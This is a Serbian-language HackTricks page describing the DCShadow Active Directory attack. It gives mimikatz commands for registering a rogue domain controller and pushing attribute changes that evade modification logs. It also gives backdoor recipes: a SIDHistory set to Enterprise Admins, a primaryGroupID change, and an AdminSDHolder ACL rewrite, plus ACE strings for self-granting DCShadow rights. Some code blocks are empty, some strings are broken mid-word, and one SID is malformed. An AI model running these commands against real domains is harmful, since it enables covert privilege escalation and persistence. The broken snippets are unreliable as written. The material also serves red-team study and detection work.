# DCShadow

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **ubaci atribute** (SIDHistory, SPN...) na određene objekte **bez** ostavljanja bilo kakvih **logova** u vezi sa **modifikacijama**. Potrebne su vam DA privilegije i morate biti unutar **root domena**.\
Imajte na umu da će se pojaviti prilično ružni logovi ako koristite netačne podatke.

Da biste izvršili napad, potrebna su vam 2 instancije mimikatz-a. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate navesti promene koje želite da izvršite), a druga instanca će se koristiti za ubacivanje vrednosti:

{% code title="mimikatz1 (RPC serveri)" %}
```
```
{% endcode %}

```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

{% code title="mimikatz2 (push) - Potrebno je DA ili slično" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Primetite da **`elevate::token`** neće raditi u sesiji `mimikatz1` jer to podiže privilegije niti, već nam je potrebno podići **privilegije procesa**.\
Možete takođe odabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Možete izvršiti promene sa DA ili sa korisnikom sa minimalnim ovlašćenjima:

* U **domenskom objektu**:
* _DS-Install-Replica_ (Dodaj/Ukloni repliku u domenu)
* _DS-Replication-Manage-Topology_ (Upravljanje topologijom replikacije)
* _DS-Replication-Synchronize_ (Sinhronizacija replikacije)
* **Sites objekat** (i njegova deca) u **Configuration kontejneru**:
* _CreateChild i DeleteChild_
* Objekat **računara koji je registrovan kao DC**:
* _WriteProperty_ (Ne Write)
* **Ciljni objekat**:
* _WriteProperty_ (Ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da biste dali ova ovlašćenja neprivilegovanom korisniku (primetite da će ovo ostaviti neke logove). Ovo je mnogo restriktivnije od DA privilegija.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Ovo znači da korisničko ime _**student1**_ kada je prijavljeno na mašini _**mcorp-student1**_ ima DCShadow ovlašćenja nad objektom _**root1user**_.

### Korišćenje DCShadow za kreiranje zadnjih vrata

{% code title="Postavljanje SIDHistory za korisnika na Enterprise Admins" %}
```
```
{% endcode %}

```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

{% code title="Promena PrimaryGroupID (postavljanje korisnika kao člana Domain Administratora)" %}
```
```
{% endcode %}

```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

{% code title="Izmenite ntSecurityDescriptor AdminSDHolder-a (dodelite punu kontrolu korisniku)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

### Shadowception - Dajte DCShadow dozvole koristeći DCShadow (bez modifikovanih logova dozvola)

Potrebno je dodati sledeće ACE-ove sa SID-om našeg korisnika na kraju:

* Na objekt domena:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Na objektu napadačkog računara: `(A;;WP;;;UserSID)`
* Na ciljnom korisničkom objektu: `(A;;WP;;;UserSID)`
* Na objektu Lokacije u kontejneru Konfiguracija: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Primetite da u ovom slučaju morate napraviti **nekoliko promena,** a ne samo jednu. Dakle, u **mimikatz1 sesiji** (RPC server) koristite parametar **`/stack` sa svakom promenom** koju želite da napravite. Na taj način, samo ćete jednom morati da izvršite **`/push`** da biste izvršili sve zaglavljene promene na lažnom serveru.

[**Više informacija o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
